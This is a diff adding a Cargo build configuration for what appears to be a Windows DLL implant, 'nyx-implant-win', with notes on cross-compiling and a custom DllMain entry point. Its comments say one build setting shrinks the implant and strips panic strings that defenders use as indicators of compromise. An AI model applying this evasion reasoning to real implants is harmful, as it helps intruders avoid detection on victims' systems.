@@ -1,0 +1,38 @@
+# Build configuration for nyx-implant-win.
+#
+# This crate is `#![no_std]` + `#![no_main]` with `panic = "abort"` (release
+# profile). The default precompiled core is built with `panic = "unwind"`, so
+# linking fails unless core/alloc are rebuilt with a matching panic strategy.
+#
+# Reproducible cross-build (mingw-w64 must be installed; on macOS that's
+# `brew install mingw-w64`):
+#
+#   RUSTFLAGS="-Zunstable-options -Cpanic=immediate-abort" \
+#     cargo +nightly build --release -p nyx-implant-win \
+#       --target x86_64-pc-windows-gnu \
+#       -Zbuild-std=core,compiler_builtins,alloc
+#
+# Why `-Cpanic=immediate-abort`: the historical `-Zbuild-std-features=
+# panic_immediate_abort` is promoted to a real panic strategy on recent
+# nightlies (see the compile_error in core). `immediate-abort` aborts on panic
+# without formatting the panic payload — shrinks the implant and removes
+# panic-string IOCs. RUSTFLAGS (not this file) is the only place a -C panic
+# flag can be set, so it's passed on the command line above.
+#
+# We intentionally do NOT set `[build] target` here: it would force this target
+# on every cargo invocation in this directory (including `cargo check` from an
+# editor). Pass `--target` explicitly on the build command.
+
+[unstable]
+build-std = ["core", "compiler_builtins", "alloc"]
+
+[target.x86_64-pc-windows-gnu]
+# mingw-w64 linker. `-nostartfiles` skips CRT startup objects (dllcrt2.o):
+# we provide our own `DllMain` in `dllmain.rs` as the real entry point.
+# Without this, the CRT startup crashes on Windows Server 2025 (build 26100)
+# with STATUS_STACK_BUFFER_OVERRUN (0xC0000409).
+# `-Z stack-protector=none` is needed because -nostartfiles also skips
+# __security_cookie init — without it, ANY function with a stack frame
+# would fail the GS cookie check.
+linker = "x86_64-w64-mingw32-gcc"
+rustflags = ["-C", "link-args=-nostartfiles -Wl,-e,DllMain", "-Zstack-protector=none"]
